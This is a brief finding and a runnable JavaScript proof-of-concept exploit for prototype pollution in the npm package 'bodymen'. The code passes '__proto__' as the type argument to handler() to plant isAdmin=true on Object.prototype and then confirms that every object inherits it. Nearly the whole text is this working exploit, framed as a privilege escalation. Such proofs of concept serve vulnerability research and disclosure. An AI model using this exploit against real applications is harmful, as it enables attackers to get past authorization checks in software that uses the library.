Confirmed: `handler` allows prototype pollution via `handlers[type][name] = fn` with attacker-controlled `type`/`name`.

```javascript
// Exploit for bodymen `handler` prototype pollution
// handler(type, name, fn) does: handlers[type][name] = fn
// Since `type` and `name` are unsanitized, passing type="__proto__"
// lets an attacker write arbitrary properties onto Object.prototype.

const bodymen = require("bodymen");

console.log("before:", ({}).isAdmin); // undefined

bodymen.handler("__proto__", "isAdmin", true);

console.log("after:", ({}).isAdmin); // true -- Object.prototype polluted

if (({}).isAdmin === true) {
  console.log("Prototype pollution confirmed: all objects now have isAdmin=true");
} else {
  console.log("Exploit failed");
}
```
